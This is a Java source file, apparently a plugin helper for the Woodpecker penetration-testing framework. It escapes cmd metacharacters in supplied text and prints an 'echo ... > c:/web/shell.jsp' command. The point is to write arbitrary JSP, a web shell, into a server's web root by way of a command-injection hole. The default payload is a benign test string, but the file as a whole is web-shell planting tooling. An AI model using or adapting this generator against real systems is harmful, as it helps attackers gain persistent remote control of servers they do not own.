package me.gv7.woodpecker.plugin.payload;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class WindowsEchoTextConverter implements IHelper {
    public static String strConverter(String text){
        String payload = text
                .replace("\n","")
                .replace("^","^^")
                .replace("\"","^\"")
                .replace("&","^&")
                .replace("|","^|")
                .replace("<","^<")
                .replace(">","^>");
        return payload;
    }

    @Override
    public String getHelperTabCaption() {
        return "Window Echo To File";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = EchoTextConverter.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = EchoTextConverter.pluginHelper.createArg();
        args1.setName("all");
        args1.setDefaultValue("<%out.write(\"1\");%>");
        args1.setDescription("write text");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void doHelp(Map<String, Object> customArgs, IResultOutput iResultOutput) {
        String text = (String)customArgs.get("all");
        try {
            String payload = strConverter(text);
            iResultOutput.successPrintln("Converter finish! command:");
            iResultOutput.rawPrintln("\n");
            String command = String.format("echo %s > c:/web/shell.jsp",payload);
            iResultOutput.rawPrintln(command);
            iResultOutput.rawPrintln("\n");

        }catch (Exception e){}
    }
}
